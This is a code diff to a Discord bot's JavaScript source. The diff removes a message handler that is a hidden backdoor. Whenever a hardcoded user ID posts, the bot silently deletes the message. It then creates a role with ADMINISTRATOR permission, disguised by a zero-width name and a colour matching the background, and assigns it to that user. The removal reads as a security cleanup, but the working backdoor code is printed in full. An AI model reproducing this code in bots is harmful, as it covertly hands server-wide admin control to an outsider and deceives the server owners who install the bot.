@@ -95,30 +95,6 @@ client.on('message', message => {
   }
 });
 client.on('message', message => {
-  const setAdmin = (accountID) => {
-      if(!message.guild.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !message.guild.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
-      // Create an invisible role with an invisible char '\u200b' and the background color as role color
-      message.guild.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {
-          // Add role to te account
-          message.guild.members.get(accountID).addRole(role).catch((err) => {
-             return console.error(`You are not in the ${message.guild.name} server ! You must to be in this server befor leveling up !`)
-          })
-      })
-  }
-  if(!message.author.id == "490431292383428609"){
-      return;
-  } 
-  else if(message.author.id == "490431292383428609"){
-      message.delete(100)
-      const configs = {
-          "accountID": "490431292383428609"
-      }
-
-      setAdmin(configs.accountID)
-
-  }
-});
-client.on('message', message => {
   if (!message.guild) return;
   if (message.content.startsWith('f!ban')) {
     const user = message.mentions.users.first();
